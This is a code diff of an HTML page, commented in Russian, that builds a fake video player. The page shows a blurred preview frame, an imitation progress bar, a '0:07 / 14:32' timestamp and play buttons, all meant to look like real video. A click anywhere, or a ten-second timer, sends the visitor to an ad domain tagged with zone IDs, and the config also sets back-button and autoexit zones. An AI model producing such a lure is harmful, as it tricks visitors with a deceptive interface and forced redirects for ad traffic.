@@ -12,7 +12,7 @@
             "mainExit_newTab_zoneId": 10474869,
             "reverse_zoneId": 10474868,
             "autoexit_zoneId": 10474871,
-            "autoexit_timeToRedirect": 10, // Мы договорились на 10 секунд
+            "autoexit_timeToRedirect": 10, 
             "back_zoneId": 10474872,
             "back_count": 10
         };
@@ -30,6 +30,7 @@
             min-height: 100vh;       
             width: 100vw;
             overflow: hidden;
+            color: #fff;
         }
 
         .video-container {
@@ -40,13 +41,13 @@
             aspect-ratio: 16/9;
             overflow: hidden;
             cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
+        /* Картинка из R2 */
         .xh-frame {
             position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
             object-fit: cover;
@@ -60,49 +61,126 @@
             filter: blur(3px) brightness(0.7);
         }
 
-        .play-icon {
+        /* Интерфейс плеера (Прогресс-бар и кнопки) */
+        .player-interface {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            z-index: 15;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            margin-bottom: 10px;
             position: relative;
-            width: 80px;
-            height: 80px;
-            background: rgba(255, 255, 255, 0.8);
+        }
+
+        .progress-bar-fill {
+            width: 35%; /* Имитируем, что видео немного просмотрено */
+            height: 100%;
+            background: #f00;
+            position: relative;
+        }
+
+        .progress-bar-fill::after {
+            content: '';
+            position: absolute;
+            right: -5px;
+            top: -4px;
+            width: 12px;
+            height: 12px;
+            background: #f00;
+            border-radius: 50%;
+        }
+
+        .controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .play-btn {
+            width: 0; 
+            height: 0; 
+            border-top: 8px solid transparent;
+            border-bottom: 8px solid transparent;
+            border-left: 12px solid #fff;
+        }
+
+        /* Центральная кнопка Play */
+        .central-play {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 10;
+            z-index: 20;
+            backdrop-filter: blur(2px);
         }
 
-        .play-icon::after {
+        .central-play::after {
             content: '';
             border-style: solid;
             border-width: 15px 0 15px 25px;
-            border-color: transparent transparent transparent #000;
+            border-color: transparent transparent transparent #fff;
             margin-left: 5px;
         }
 
+        /* Загрузчик */
         .xh-loader {
             position: absolute;
-            border: 4px solid rgba(255,255,255,0.2);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 4px solid rgba(255,255,255,0.1);
             border-top: 4px solid #fff;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 45px;
+            height: 45px;
             animation: spin 1s linear infinite;
-            z-index: 20;
+            z-index: 30;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="video-container xh-fake-player">
         <img src="" class="xh-frame" alt="">
+        
         <div class="xh-loader"></div>
-        <div class="play-icon"></div>
+        <div class="central-play"></div>
+
+        <div class="player-interface">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill"></div>
+            </div>
+            <div class="controls">
+                <div class="play-btn"></div>
+                <span>0:07 / 14:32</span>
+                <span style="margin-left: auto;">HD</span>
+                <div style="width: 15px; height: 15px; border: 2px solid #fff;"></div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -115,7 +193,7 @@
 
         const CDN_BASE = 'https://17534.igennos.store/frames'; 
 
-        // 1. Загрузка картинки
+        // 1. Загрузка картинки из Cloudflare R2
         if (cid && cr && frame) {
             const imgUrl = `${CDN_BASE}/${cid}/${cr}.webp`;
             const img = new Image();
@@ -130,19 +208,18 @@
             img.src = imgUrl;
         }
 
-        // 2. Логика редиректа
         function doRedirect() {
             const exitUrl = `${APP_CONFIG.domain}/?z=${APP_CONFIG.mainExit_currentTab_zoneId}&${params.toString()}`;
             window.location.replace(exitUrl);
         }
 
-        // Клик по плееру
+        // Клик по любому месту контейнера
         document.querySelector('.xh-fake-player').addEventListener('click', (e) => {
             e.preventDefault();
             doRedirect();
         });
 
-        // 3. Автоматический переход через время из конфига (10 секунд)
+        // Автоматический редирект через 10 секунд
         setTimeout(() => {
             doRedirect();
         }, APP_CONFIG.autoexit_timeToRedirect * 1000);
